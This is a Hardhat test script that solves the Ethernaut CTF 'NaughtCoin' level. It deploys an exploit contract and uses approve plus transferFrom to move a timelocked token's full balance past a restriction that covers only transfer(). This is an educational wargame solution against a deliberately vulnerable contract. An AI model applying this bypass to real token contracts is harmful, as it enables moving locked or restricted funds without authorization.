import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";

describe("NaughtCoin", function(){
    it("Aims to Solve the NaughtCoin Question of the Ethernaut CTF", async function() {
        
        this.timeout(0);

        // Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

        // Define Target ABI
        const targetABI = [
            "function balanceOf(address account) public view returns (uint256)",
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
            "function totalSupply() public view returns(uint256)",
        ];
        const targetAddr = "0x3B6189326B41d4d3d17f733C879AfbeC7cB2d36f"; // Target Contract Address Here

        // Connect to the Target Contract
        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa)
        console.log("Target Contract Deployed");

        // Define and Connect to the Malicious Contract
        const maliciousFactory = await ethers.getContractFactory("NaughtCoinExploit");
        const maliciousContract = await maliciousFactory.deploy();

        // Wait for Malicious Contract to be Deployed
        await eoa.provider!.waitForTransaction(maliciousContract.deployTransaction.hash);   
        console.log(`Malicious Contract Deployed at: ${maliciousContract.address}` );

        // Get Token Amount
        let tokenBalance = await targetCont.totalSupply();
        console.log(`Current token balance: ${tokenBalance}`);

        // Approve Token Balance
        let transaction = await targetCont.approve(eoa.address, tokenBalance);
        await transaction.wait();
        console.log(`Balance Approved: \n`);
        console.log(transaction);
        
        // Transfer Tokens 
        transaction = await targetCont.transferFrom(eoa.address, maliciousContract.address, tokenBalance);
        await transaction.wait();

        //Final Check
        tokenBalance = await targetCont.balanceOf(eoa.address);
        expect(tokenBalance).to.eq(0);
        
    });
});